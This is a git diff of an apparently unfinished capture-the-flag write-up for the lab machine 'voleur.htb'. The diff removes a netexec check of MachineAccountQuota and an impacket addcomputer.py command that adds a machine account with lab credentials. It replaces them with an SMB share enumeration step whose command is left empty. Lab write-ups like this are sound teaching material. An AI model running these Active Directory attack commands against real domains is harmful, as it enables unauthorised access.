@@ -32,16 +32,10 @@
 
 ![image](https://github.com/user-attachments/assets/9374b63e-36de-4aa2-96d2-ef3957b8f57b)
 
-2. Bloodhound doesn't give us a path from credentials given ryan.naylor. After enumerating using netexec ldap, found non zero MachineAccountQuota
+2. Bloodhound doesn't give us a path from credentials given ryan.naylor. After enumerating using netexec smb, found an interesting IT share so download files with the spider_plus module
 
-`nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -d voleur.htb -k -M maq`
+``
 
-![image](https://github.com/user-attachments/assets/74968e9e-d30a-434f-b598-03bbd6691242)
+![image](https://github.com/user-attachments/assets/ac3f931f-437f-47de-a391-d6399fff89d4)
 
-3. Using impacket's addcomputer.py script, add a machine account
-
-`addcomputer.py voleur.htb/ryan.naylor:HollowOct31Nyt -computer-name 'TEST$' -computer-pass 'Test123' -dc-ip dc.voleur.htb -dc-host dc.voleur.htb -k`
-
-![image](https://github.com/user-attachments/assets/d03c42e6-1cba-4b7c-a4fc-7948354beb77)
-
-4. 
+3. 
